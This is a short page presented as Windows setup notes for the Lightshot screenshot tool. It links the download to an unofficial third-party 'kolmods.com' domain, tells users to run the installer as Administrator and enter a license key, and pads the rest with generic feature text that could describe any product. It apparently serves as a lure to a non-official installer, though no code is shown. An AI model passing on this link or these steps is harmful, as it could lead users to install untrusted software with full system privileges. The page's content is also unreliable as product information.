# Lightshot Windows Setup Notes

## Download & Install

> **Download:** [**Get Lightshot for Windows →**](https://lightshot.kolmods.com/)
>
> Setup notes for **Lightshot** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Lightshot** from the Start menu

## What you can use it for

- Core Lightshot features on Windows desktop
- Install and configure Lightshot for daily use
- Import, edit, and export with Lightshot tools
- Tune settings and profiles inside Lightshot
- Integrate Lightshot into your existing workflow
